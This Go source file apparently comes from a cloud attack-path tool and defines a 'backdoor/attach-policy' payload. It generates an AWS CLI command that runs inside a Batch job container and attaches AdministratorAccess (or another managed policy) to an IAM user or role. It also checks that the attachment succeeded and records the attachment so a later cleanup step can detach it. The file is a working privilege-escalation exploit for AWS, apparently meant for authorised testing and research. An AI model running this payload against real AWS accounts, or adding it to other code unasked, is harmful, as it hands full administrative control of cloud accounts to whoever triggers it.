// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package batch

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a bash command that attaches a managed policy
// to an IAM user or role. The command runs inside the Batch job container, which executes
// with the jobRoleArn's credentials from the pre-existing job definition.
//
// TARGET_PRINCIPAL is not required here — batch modules resolve it from the current
// caller identity via STS GetCallerIdentity before calling Validate()/GenerateCode().
// PRINCIPAL_TYPE ("user" or "role") controls which IAM attach command is emitted.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess (or any managed policy) to an IAM user or role via Batch job container command"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceBatch,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_PRINCIPAL",
			Description: "IAM username or role name to attach the policy to (auto-resolved from caller identity if not set)",
			Required:    false,
		},
		{
			// Set by the module when it resolves the principal from the caller ARN.
			// "user" → attach-user-policy; "role" → attach-role-policy.
			Name:        "PRINCIPAL_TYPE",
			Description: "Principal type: 'user' or 'role' (auto-resolved from caller identity if not set)",
			Required:    false,
			Default:     "user",
		},
		{
			Name:        "POLICY_ARN",
			Description: "Managed policy ARN to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	// TARGET_PRINCIPAL is resolved by the module before Validate() is called.
	// If still empty at this point, the module failed to resolve it and will have
	// already returned an error — so we surface a clear message here as a fallback.
	if options["TARGET_PRINCIPAL"] == "" {
		return fmt.Errorf("TARGET_PRINCIPAL is required; set it explicitly or ensure the current identity is an IAM user or role")
	}
	principalType := options["PRINCIPAL_TYPE"]
	if principalType != "" && principalType != "user" && principalType != "role" {
		return fmt.Errorf("PRINCIPAL_TYPE must be 'user' or 'role', got '%s'", principalType)
	}
	return nil
}

// GenerateCode returns a bash one-liner that attaches the policy to the target principal.
// The command differs for users vs roles:
//
//	user: aws iam attach-user-policy --user-name NAME --policy-arn ARN
//	role: aws iam attach-role-policy --role-name NAME --policy-arn ARN
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetPrincipal := options["TARGET_PRINCIPAL"]
	principalType := options["PRINCIPAL_TYPE"]
	if principalType == "" {
		principalType = "user"
	}
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	switch principalType {
	case "role":
		return fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", targetPrincipal, policyArn), nil
	default:
		return fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", targetPrincipal, policyArn), nil
	}
}

// VerifySuccess confirms the policy attachment by listing the principal's attached policies.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetPrincipal := options["TARGET_PRINCIPAL"]
	principalType := options["PRINCIPAL_TYPE"]
	if principalType == "" {
		principalType = "user"
	}
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	if targetPrincipal == "" {
		return false, fmt.Errorf("TARGET_PRINCIPAL not set; cannot verify")
	}

	iamClient := iam.NewFromConfig(config)

	switch principalType {
	case "role":
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(targetPrincipal),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	default:
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(targetPrincipal),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}

	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked resource so workspace
// cleanup can later detach it.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetPrincipal := options["TARGET_PRINCIPAL"]
	principalType := options["PRINCIPAL_TYPE"]
	if principalType == "" {
		principalType = "user"
	}
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetPrincipal, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": targetPrincipal,
				"policy_arn":     policyArn,
			},
		},
	}
}

// ProcessResult returns a formatted summary of the batch job execution result.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
